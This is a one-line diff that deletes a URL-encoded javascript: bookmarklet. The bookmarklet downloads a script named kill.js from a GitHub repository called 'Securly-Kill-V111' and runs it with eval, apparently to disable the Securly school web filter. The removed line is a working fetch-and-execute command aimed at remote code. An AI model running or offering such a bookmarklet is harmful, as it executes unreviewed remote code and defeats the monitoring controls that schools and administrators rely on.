@@ -1,1 +1,0 @@
-javascript:fetch(%22https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js%22).then(r%20=%3E%20r.text()).then(r%20=%3E%20eval(r))%20//%20made%20by%20zek-c
